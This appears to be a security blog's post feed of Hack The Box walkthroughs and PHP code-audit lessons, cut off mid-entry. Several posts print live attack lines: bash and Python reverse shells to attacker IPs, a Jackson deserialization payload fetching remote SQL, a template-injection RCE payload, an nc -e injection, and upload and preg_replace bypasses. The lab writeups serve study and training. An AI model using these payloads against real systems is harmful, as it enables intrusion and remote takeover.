Writeup","slug":"HTB-Academy","date":"2020-11-12T16:00:00.000Z","updated":"2023-11-30T10:29:10.879Z","comments":true,"path":"2020/11/13/HTB-Academy/","permalink":"https://ik0nw.github.io/2020/11/13/HTB-Academy/","excerpt":"","text":"NmapMaking a script scan on all ports Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 11:27 +08 Nmap scan report for 10.129.20.117Host is up (0.27s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://academy.htb/33060/tcp open mysqlx?1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port33060-TCP:V=7.80%I=7%D=11/8%Time=5FA765A9%P=x86_64-pc-linux-gnu%r(GSF:enericLines,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 183.87 seconds As Usual, add the hostname to /etc/hosts Visit the academy.htb site, only a background nothing clickable. Right click look at the souce, found the login and register site. Trying to attemp with default admin creds. No errors been show, guess it is either not responsive or the error message is hidden. Always use burp when you’re unsure about something in web, didnt see anything special. Move to register.php, we found something juicy here. There’s a roleid parameter Register 2 account with different roleid However both account seems similar, it didnt login into the username I register, instead login as egre55 Tried gobuster, and we found a admin.php With the roleid=1 account, manage to find a new subdomain dev-staging-01.academy.htb add it into /etc/hosts Manage to interprate the site is running on PHP laravel framework Perform searchsploit we found a potential metasploitable CVE, it needs APP_KEY set VHOST dev-staging-01.academy.htbset APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=set rhosts academy.htbset lhost 10.10.14.2 And we got the www-data After searching around, found one password in /var/www/html/academy/.env APP_NAME=LaravelAPP_ENV=localAPP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=APP_DEBUG=falseAPP_URL=http://localhostLOG_CHANNEL=stackDB_CONNECTION=mysqlDB_HOST=127.0.0.1DB_PORT=3306DB_DATABASE=academyDB_USERNAME=devDB_PASSWORD=mySup3rP4s5w0rd!!......... By looking at the /home directory, we have total of 6 user www-data@academy:/home$ lsls21y4d ch4p cry0l1t3 egre55 g0blin mrb3n With trial and error, we manage to su as cry0l1t3 or you can just SSH in to get a proper shell $ iduid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm) Found cry0l1ts is in adm group. With a bit of google adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in &#x2F;var&#x2F;log, and can use xconsole. Historically, &#x2F;var&#x2F;log was &#x2F;usr&#x2F;adm (and later &#x2F;var&#x2F;adm), thus the name of the group. admin: The admin group is used to grant sudo access on ubuntu 11.10 and earlier Tons of log event are recorded, with help of some kind soul. manage to find the right one type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210A Decode the hex character and we got mrb3n_Ac@d3my! Again trial and error we are able login to mrb3n perform sudo -l $ sudo -l [sudo] password for mrb3n: Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser mrb3n may run the following commands on academy: (ALL) /usr/bin/composer Search gtfobin and we got a easy root.","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"easy","slug":"easy","permalink":"https://ik0nw.github.io/tags/easy/"}]},{"title":"HTB Time Writeup","slug":"HTB-Time","date":"2020-11-07T00:00:00.000Z","updated":"2023-11-30T10:17:47.858Z","comments":true,"path":"2020/11/07/HTB-Time/","permalink":"https://ik0nw.github.io/2020/11/07/HTB-Time/","excerpt":"","text":"NmapStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 20:06 +08Nmap scan report for 10.10.10.214Host is up (0.0074s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Online JSON parserService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds Start to enumerate at the http port Not able to find other directory other than the index page Guess this is the only route to user Tried different input Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#x27;test&#x27;: was expecting &#x27;null&#x27;, &#x27;true&#x27;, &#x27;false&#x27; or NaN Found some error message. After googling, with the keyword fasterxml and jackson we found this CVE Create a inject.sql with bash reverse shell CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; String[] command = &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; &#125;$$;CALL SHELLEXEC(&#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&#x27;) Start a python server python -m SimpleHTTPServer 8000 Also start a listner nc -nvlp 8080 Finally our payload [&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://x.x.x.x/inject.sql&#x27;&quot;&#125;] ​ And we got our reverse shell back Privilege escalationAfter some enumeration manage to find something interesting using PSPY64 &#x2F;usr&#x2F;bin&#x2F;timer_backup.sh is run by Root -rwxrw-rw- 1 pericles pericles 88 Nov 7 12:50 /usr/bin/timer_backup.sh We have write permission. echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.22/5555 0&gt;&amp;1&quot; &gt;&gt; /usr/bin/timer_backup.sh and we get a easy root. But the nc will exit somehow less than 30second, another method is to write your public key and enter in SSH listening on [any] 5555 ...connect to [10.10.14.22] from (UNKNOWN) [10.10.10.214] 33944bash: cannot set terminal process group (230926): Inappropriate ioctl for devicebash: no job control in this shellroot@time:/# whoami &amp;&amp; id &amp;&amp; hostnamewhoami &amp;&amp; id &amp;&amp; hostnamerootuid=0(root) gid=0(root) groups=0(root)timeroot@time:/# exit","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"medium","slug":"medium","permalink":"https://ik0nw.github.io/tags/medium/"}]},{"title":"HTB Doctor Writeup","slug":"HTB-Doctor","date":"2020-10-06T00:00:00.000Z","updated":"2023-11-29T13:14:44.109Z","comments":true,"path":"2020/10/06/HTB-Doctor/","permalink":"https://ik0nw.github.io/2020/10/06/HTB-Doctor/","excerpt":"","text":"Author IkonwNmap# Nmap 7.80 scan initiated Sun Sep 27 09:39:47 2020 as: nmap -Pn -sCV -p22,80,8089 -oN nmap/Full_10.129.11.0.nmap 10.129.11.0Nmap scan report for doctor.htb (10.129.11.0)Host is up (0.25s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Doctor8089/tcp open ssl/http Splunkd httpd| http-robots.txt: 1 disallowed entry |_/|_http-server-header: Splunkd|_http-title: splunkd| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Not valid before: 2020-09-06T15:57:27|_Not valid after: 2023-09-06T15:57:27Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Start enumeration on port 80, found the info@doctors.htb email. Let’s add the hostname doctors.htb to /etc/hosts After adding to host file, visit doctors.htb come to a login page Tried to use info@doctors.htb to login, with the reset password function, we can verify that info@doctors.htb is not a valid account. Once we register, there’s only one function. From the page source, we found /archive but it appears to be blank page The New Post is vulnerable to server site template injection Server Side Template Injection Payloads When we input &#123;&#123;7*7&#125;&#125; , we notice that it is shown on the /archive page. can confirmed that it is using either Twig or Jinja2 Next up, craft a malicious payload to obtain reverse connecction &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;10.10.14.67\\&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/bash\\&quot;, \\&quot;-i\\&quot;]);&#x27;&quot;).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125; Another way would be using malicious curl command, this seems the unintended way &lt;img src=http://10.10.14.67:1337/$(nc.traditional$IFS-e$IFS/bin/bash$IFS&#x27;10.10.14.67&#x27;$IFS&#x27;4444&#x27;)&gt; WWW-data to UserWent to /home directory we found user shaun Found user password in /var/log/apache/backup And we can switch to user shaun. Using the privilege escalation suggester we got the splunk is vulnerable. By using the https://github.com/cnotin/SplunkWhisperer2 we are able to get privileges’ to root Initial foothold is more annoying, from www-data to user to root is easy","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"easy","slug":"easy","permalink":"https://ik0nw.github.io/tags/easy/"}]},{"title":"PHP::in_array() Type Juggling","slug":"PHP-audit-lab day3","date":"2020-09-25T00:00:00.000Z","updated":"2021-01-11T15:56:11.728Z","comments":true,"path":"2020/09/25/PHP-audit-lab day3/","permalink":"https://ik0nw.github.io/2020/09/25/PHP-audit-lab%20day3/","excerpt":"","text":"&lt;?phpfunction __autoload($className) &#123; include $className;&#125;$controllerName = $_GET[&#x27;c&#x27;];$data = $_GET[&#x27;d&#x27;];if (class_exists($controllerName)) &#123; $controller = new $controllerName($data); $controller-&gt;render();&#125; else &#123; echo &#x27;There is no page with this name&#x27;;&#125;class HomeController &#123; private $data; public function __construct($data) &#123; $this-&gt;data = $data; &#125; public function render() &#123; if ($this-&gt;data[&#x27;new&#x27;]) &#123; echo &#x27;controller rendering new response&#x27;; &#125; else &#123; echo &#x27;controller rendering old response&#x27;; &#125; &#125;&#125;?&gt; First vulnerability in line 9, according to PHP manual. #class_exists class_exists - This function checks whether or not the given class has been definded class_exists ( string $class_name, bool $autoload &#x3D; true) : bool ##Parameter class_name The class name. THe name is matched in a case-insensitive manner. auto_load Whether or not to call __autoload by default In this case, the class_exists function will check if the controller name we pass in is a valid, but it will first have to called the autoload function making sure all the function is loaded. When this happens, it actually includes the unknown $classname parameter we passed in.","categories":[{"name":"php-audit","slug":"php-audit","permalink":"https://ik0nw.github.io/categories/php-audit/"}],"tags":[{"name":"PHP,in_array(),type-juggling","slug":"PHP-in-array-type-juggling","permalink":"https://ik0nw.github.io/tags/PHP-in-array-type-juggling/"}]},{"title":"PHP::in_array() Type Juggling","slug":"PHP^%^%in_array()-Type Juggling","date":"2020-09-25T00:00:00.000Z","updated":"2020-09-25T10:07:41.394Z","comments":true,"path":"2020/09/25/PHP^%^%in_array()-Type Juggling/","permalink":"https://ik0nw.github.io/2020/09/25/PHP^%^%in_array()-Type%20Juggling/","excerpt":"PHP often known as a ‘loosely typed’ programming language","text":"PHP often known as a ‘loosely typed’ programming language If we recall in PHP, no data types in any variable have to define. In the circumstance of comparisons of different variable, PHP will automatically convert the data into same data type. For example, if we want to compare integer to string. PHP will convert string to integer.Let’s assume a situation. We have a input field asking for the number of bottle. &lt;?phpif(isset($_GET[&#x27;num_bottles&#x27;]))&#123; $num_bottles = $_GET[&#x27;num_bottles&#x27;]; if($num_bottles == 0)&#123; echo &quot;You have order 0 bottles\\n&quot;; &#125; if($num_bottles == 1)&#123; echo &quot;You have order 1 bottles\\n&quot;; &#125; if($num_bottles == 2)&#123; echo &quot;You have order 2 bottles\\n&quot;; &#125; if(!is_numeric($num_bottles))&#123; echo &quot;Please enter only numbers\\n&quot;; &#125;&#125;else&#123; echo &quot;Input numbers&quot;;&#125;?&gt; When we try to submit 1 to num_bottles. As we say early on, when comparing string($_GET[num_bottles] will be string data type) and integer, it will auto convert strings to integer. so it match the first if statement ┌──(root💀kali)-[~/Desktop/php-audit/day1]└─# curl localhost:8080/test.php?num_bottles=1 You have order 1 bottles It seems nothing special that &quot;1&quot; == 1What if the user input is “1bottle” ? YES, PHP will treat “2bottles” as 2 because of it’s loosely comparison. It will abstract the leading numbers from the beginning of string and convert to integer. ┌──(root💀kali)-[~/Desktop/php-audit/day1]└─# curl localhost:8080/test.php?num_bottles=1bottlesYou have order 1 bottlesPlease enter only numbers ┌──(root💀kali)-[~/Desktop/php-audit/day1]└─# curl localhost:8080/test.php?num_bottles=2bottlesYou have order 2 bottlesPlease enter only numbers you might ask, what if there are no numbers?PHP will treat the string as 0 ┌──(root💀kali)-[~/Desktop/php-audit/day1]└─# curl localhost:8080/test.php?num_bottles=bottlesYou have order 0 bottlesPlease enter only numbers CTF Challenge - in_array() type jugglingCTF challenge from PHP SECURITY CALENDAR class Challenge &#123; const UPLOAD_DIRECTORY = &#x27;./solutions/&#x27;; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file[&#x27;name&#x27;], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file[&#x27;tmp_name&#x27;], self::UPLOAD_DIRECTORY . $this-&gt;file[&#x27;name&#x27;] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES[&#x27;solution&#x27;]); The have to bypass the restriction of white listing check with the function in_array() Description in_array ( mixed $needle , array $haystack [, bool $strict &#x3D; FALSE ] ) : bool Searches for needle in haystack using loose comparison unless strict is set. Parametersneddle &#x3D; The Searched Value haystack &#x3D; The array. strictIf the third parameter strict is set to TRUE then the in_array() function will also check the types of the needle in the haystack. How in_array() is by comparing a needle to every values in an array. When strict is not set to TRUE, it will not restrict in data types. That’s when PHP loosely comparison come into play. if we want to upload a malicious PHP files, the filename has to be end with .php but with the restricted white list, we are only allow to send file in the range of 1 - 24. We can easily construct a file with leading numbers, will bypass the in_array() check EnvironmentDocker for convenient docker run --name app8 -d -p 8080:80 -v $(pwd):/var/www/app romeoz/docker-apache-php:7.0 A simple file for uploading &lt;!doctype html&gt;&lt;html&gt;&lt;body&gt; &lt;form action=&quot;day1.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;solution&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; name the malicious file as 1malicious.php will bypass the restriction CVE exampleTBD","categories":[{"name":"php-audit","slug":"php-audit","permalink":"https://ik0nw.github.io/categories/php-audit/"}],"tags":[{"name":"PHP,in_array(),type-juggling","slug":"PHP-in-array-type-juggling","permalink":"https://ik0nw.github.io/tags/PHP-in-array-type-juggling/"}]},{"title":"PHP::Preg_replace() RCE","slug":"PHP^%^%Preg_replace()-RCE","date":"2020-09-23T00:00:00.000Z","updated":"2023-12-11T06:31:51.248Z","comments":true,"path":"2020/09/23/PHP^%^%Preg_replace()-RCE/","permalink":"https://ik0nw.github.io/2020/09/23/PHP^%^%Preg_replace()-RCE/","excerpt":"PHP dangerous function preg_replace() leads to remote code execution with improper implementation","text":"PHP dangerous function preg_replace() leads to remote code execution with improper implementation Preg_replacepreg_replace — Perform a regular expression search and replace Description preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] ) : mixed EnvironmentAll the testing will be test under docker environment with php version 5.3 docker run --name app -d -p 8080:80 -v $(pwd):/var/www/app romeoz/docker-apache-php:5.3 put all your php files under the same directory with the docker file. Access the page in localhost port 8080 Startpreg_replace(patterns, replacements, input, limit, count) Searches subject for matches to pattern and replaces them with replacement. The normal use of Preg_replace() is safe enough for replacing pattern using regex Let see a example: When we want to filter unwanted words from user input and replace it with proper words &lt;?php $input = &quot;eat my shit please&quot;; if(isset($_GET[&#x27;pattern&#x27;]) &amp;&amp; isset($_GET[&#x27;replacement&#x27;]))&#123; $pattern = $_GET[&#x27;pattern&#x27;]; $replacement = $_GET[&#x27;replacement&#x27;]; echo preg_replace($pattern,$replacement,$input); &#125;else&#123; echo $input; &#125;?&gt; The /i modifier will match both upper and lower case letters. we expect the output to be eat my shit please without any parameter But what if we want to change the shit to poo instead ? And we filter off bad words. Everything seems fine with this function The danger comes in when the modifier set to /e instead of /i, it will cause PHP to execute the replacement value as code. the preg_replace() has come preg_replace(&#39;/shit/e&#39;,&#39;system(&#39;whoami&#39;),&quot;eat my shit please&quot;) The string shit trigger the replace function to execute a system(&#39;whoami&#39;) Null byte bypassLet’s look at the another example if we are not able to control the delimiter &lt;?php $input = &quot;eat my shit please&quot;; if(isset($_GET[&#x27;pattern&#x27;]) &amp;&amp; isset($_GET[&#x27;replacement&#x27;]))&#123; $pattern = $_GET[&#x27;pattern&#x27;]; $replacement = $_GET[&#x27;replacement&#x27;]; echo preg_replace($pattern,$replacement,$input); &#125;else&#123; echo $input; &#125;?&gt; pattern parameter no longer require the / and delimiter This code seems safe, attacker can no longer end the regular expression with their own modifier. Do take note PHP take some of the syntax from C . In C, it handles strings as a character array, it needs a way to define the last character of the string. This is done using a null byte. A null byte is denoted by \\0 in C. preg_replace function handle an input string as they handled by C. Therefore, we can input a \\0 which is %00 in URL to control the last character of the string. CTF challengeCTF challenge from PHP SECURITY CALENDAR header(&quot;Content-Type: text/plain&quot;);function complexStrtolower($regex, $value) &#123; return preg_replace( &#x27;/(&#x27; . $regex . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, $value );&#125;foreach ($_GET as $regex =&gt; $value) &#123; echo complexStrtolower($regex, $value) . &quot;\\n&quot;;&#125; We can use PHP’s curly syntax to inject the function call Complex (curly) syntax http://localhost:8080/challenges.php/?\\S*=&#123;$&#123;system(id)&#125;&#125; The reason why we are using curly syntax is because after the function complexStrtolower we are storing our result into &quot;&lt;result&gt;&quot; in double quotes In PHP, the variable in double quotes are allow to parse as variable. In curly syntax, single curly braces is for parsing variable. // Works, outputs: This is fantasticecho &quot;This is &#123;$great&#125;&quot;; Note: Functions, method calls, static class variables, and class constants inside &#123;$&#125; work since PHP 5. However, the value accessed will be interpreted as the name of a variable in the scope in which the string is defined. Using single curly braces (&#123;&#125;) will not work for accessing the return values of functions or methods or the values of class constants or static class variables. For functions we have to use double curly braces. E.g. &#123;$&#123;phpinfo()&#125;&#125; Another questionwhy we are able to execute system(id) without quote the &#39;id&#39; if we add id in single quotes, it will auto add a slash to escape the single quotes (Which I have no idea ??? Comment if you know the reason) however, in PHP. Constants without quote will assume as string beacuse of the PHP ‘loosely typed’ characterstic (Will be discover more on later post PHP type juggling) &lt;?phpecho system(whoami);?&gt; reference https://infosecabsurdity.wordpress.com/2012/12/17/phpwcms-remote-code-execution-and-php-pcre-filter-evasion-bypasses-zeroday/ https://xz.aliyun.com/t/2557 http://www.madirish.net/402","categories":[{"name":"php-audit","slug":"php-audit","permalink":"https://ik0nw.github.io/categories/php-audit/"}],"tags":[{"name":"PHP,preg_replace()","slug":"PHP-preg-replace","permalink":"https://ik0nw.github.io/tags/PHP-preg-replace/"}]},{"title":"HTB Compromised Writeup","slug":"HTB-Compromised","date":"2020-09-16T23:28:25.000Z","updated":"2021-10-10T03:29:41.591Z","comments":true,"path":"2020/09/17/HTB-Compromised/","permalink":"https://ik0nw.github.io/2020/09/17/HTB-Compromised/","excerpt":"","text":"Author: IkonwNmap Scan:# Nmap 7.80 scan initiated Thu Sep 17 12:32:35 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Full_10.10.10.207.nmap 10.10.10.207Nmap scan report for 10.10.10.207Host is up (0.13s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)| 256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)|_ 256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)| http-title: Legitimate Rubber Ducks | Online Store|_Requested resource was http://10.10.10.207/shop/en/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Sep 17 12:32:47 2020 -- 1 IP address (1 host up) scanned in 12.01 seconds Port 80 webserver was a online store As usual, launch gobuster enumerate potential directories Found a backup directory, I believe it’s the source code for the web search for the keyword username to look for potential plaintext username or hard coded password grep -R &#x27;username|password&#x27; |grep -v &#x27;jquery&#x27; and we found login.php have suspicious file_put_contents if (!empty(user::$data[&#x27;id&#x27;])) notices::add(&#x27;notice&#x27;, language::translate(&#x27;text_already_logged_in&#x27;, &#x27;You are already logged in&#x27;));if (isset($_POST[&#x27;login&#x27;])) &#123; //file_put_contents(&quot;./.log2301c9430d8593ae.txt&quot;, &quot;User: &quot; . $_POST[&#x27;username&#x27;] . &quot; Passwd: &quot; . $_POST[&#x27;password&#x27;]); user::login($_POST[&#x27;username&#x27;], $_POST[&#x27;password&#x27;], $redirect_url, isset($_POST[&#x27;remember_me&#x27;]) ? $_POST[&#x27;remember_me&#x27;] : false);&#125; Navigate to the location and we got the user and passwd admin:theNextGenSt0r3!~ Login to the authentication portal, we got the LiteCart version number And yeah, we got the poc --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------LiteCart 2.1.2 - Arbitrary File Upload | php/webapps/45267.py--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- The initial exploit was not able to work, it was able to create a php file, but system seems disable. Tried different shell execution function like shell_exec didnt work either. &lt;?php if( isset( $_REQUEST[&#x27;c&#x27;] ) ) &#123; system( $_REQUEST[&#x27;c&#x27;] . &#x27; 2&gt;&amp;1&#x27; ); &#125; ?&gt; Instead of continuing try for luck, phpinfo() will give us what function is disabled. And we got tons of function being disabled After research, found a php script able to bypass the restriction PHP 7.0-7.3 disable_functions bypass Modified the script for the pwn function pwn($_REQUEST[&#x27;c&#x27;]); Next modify the litecart poc f = open(&#x27;exploit.php&#x27;,&#x27;r&#x27;)data = f.read()files = &#123; &#x27;vqmod&#x27;: (rand + &quot;.php&quot;,data, &quot;application/xml&quot;), &#x27;token&#x27;:one, &#x27;upload&#x27;:(None,&quot;Upload&quot;) &#125; and we manage to gain rce After trying hard to I found it seems www-data is very restricted, only very few command able to execute. I didnt manage to get a proper reverse shell. After long enumeration root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologinsysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bashmysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bashred:x:1001:1001::/home/red:/bin/false I actually found that, mysql is a user. Went back to the initial foothold, I manage to find the mysql root username and password // Database define(&#x27;DB_TYPE&#x27;, &#x27;mysql&#x27;); define(&#x27;DB_SERVER&#x27;, &#x27;localhost&#x27;); define(&#x27;DB_USERNAME&#x27;, &#x27;root&#x27;); define(&#x27;DB_PASSWORD&#x27;, &#x27;changethis&#x27;); define(&#x27;DB_DATABASE&#x27;, &#x27;ecom&#x27;); define(&#x27;DB_TABLE_PREFIX&#x27;, &#x27;lc_&#x27;); define(&#x27;DB_CONNECTION_CHARSET&#x27;, &#x27;utf8&#x27;); define(&#x27;DB_PERSISTENT_CONNECTIONS&#x27;, &#x27;false&#x27;); and we got the creds for mysql root:changethis. We can launch mysql client, execute commands to write our ssh public key to authorized_keys yeah, we manage to get code execution for user mysql mysql -u root -pchangethis -e &quot;SELECT exec_cmd(&#x27;echo sshxxxxxxxxxxx&#x27; &gt; /var/lib/mysql/.ssh/authorized_keys)&quot; One thing to note here, you have to encode the + into %2B else it will be shown as a whitespace in authorized_keys file Last login: Thu Sep 3 11:52:44 2020 from 10.10.14.2mysql@compromised:~$ and we are in using ssh. After more enumeration we found a new password 3*NLJE32I$Fe it turn up to be sysadmin ‘s password su and we got the user.txt RootWe found a suspicious file .pam_unix.so Use ghidra to reverse it. in pam_sm_authenticate we found some backdoor string convert the unsigned-hex to char sequence and we got the password zlke~U3Env82m2- with a null behind root@compromised:~# whoami &amp;&amp; hostnamerootcompromised","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"reverse","slug":"reverse","permalink":"https://ik0nw.github.io/tags/reverse/"},{"name":"mysql exec_cmd","slug":"mysql-exec-cmd","permalink":"https://ik0nw.github.io/tags/mysql-exec-cmd/"}]},{"title":"HTB::Challenge [Mobile] Cat","slug":"Challenge-Cat","date":"2020-09-10T21:38:37.000Z","updated":"2020-09-20T06:44:15.280Z","comments":true,"path":"2020/09/11/Challenge-Cat/","permalink":"https://ik0nw.github.io/2020/09/11/Challenge-Cat/","excerpt":"","text":"After extracting the file from zip, we got a Andriod Backup Upon google, we found a way to extract the file ( printf &quot;\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00&quot; ; tail -c +25 backup.ab ) | tar xfvz - and we got 2 folders apps and shared and we found this picture, the flag is at the bottom of the paper HTB{ThisBackupIsUnprotected}","categories":[{"name":"hackthebox-challenge","slug":"hackthebox-challenge","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/"},{"name":"mobile","slug":"hackthebox-challenge/mobile","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/mobile/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"HTB Passage Writeup","slug":"HTB-Passage","date":"2020-09-05T21:22:53.000Z","updated":"2021-10-10T03:29:44.531Z","comments":true,"path":"2020/09/06/HTB-Passage/","permalink":"https://ik0nw.github.io/2020/09/06/HTB-Passage/","excerpt":"","text":"Nmap Scan# Nmap 7.80 scan initiated Sun Sep 6 12:17:03 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Full_10.129.5.22.nmap 10.129.5.22Nmap scan report for 10.129.5.22Host is up (0.26s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)| 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)|_ 256 